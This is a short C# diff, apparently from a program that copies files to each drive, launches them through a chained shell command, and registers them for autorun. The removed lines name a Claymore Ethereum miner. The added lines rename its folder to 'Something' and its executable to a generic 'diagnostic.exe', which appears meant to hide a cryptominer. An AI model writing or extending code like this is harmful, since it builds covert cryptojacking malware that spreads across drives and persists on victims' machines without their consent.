@@ -45,8 +45,8 @@ void Run()
             currentpath = drivers[i].Name + $"\\{folders}";
             diinf = new DirectoryInfo(dir);
             Create(currentpath, dir);
-            Firstrun($@" & cd {drivers[i]}{folders}\ClayMore & Ethereum.bat");
-            Autorun(drivers[i].Name + folders + "\\claymore\\diagnostic.exe");
+            Firstrun($@" & cd {drivers[i]}{folders}\Something & diagnostic.exe");
+            Autorun(drivers[i].Name + folders + "\\Something\\diagnostic.exe");
             break;
         }
     }
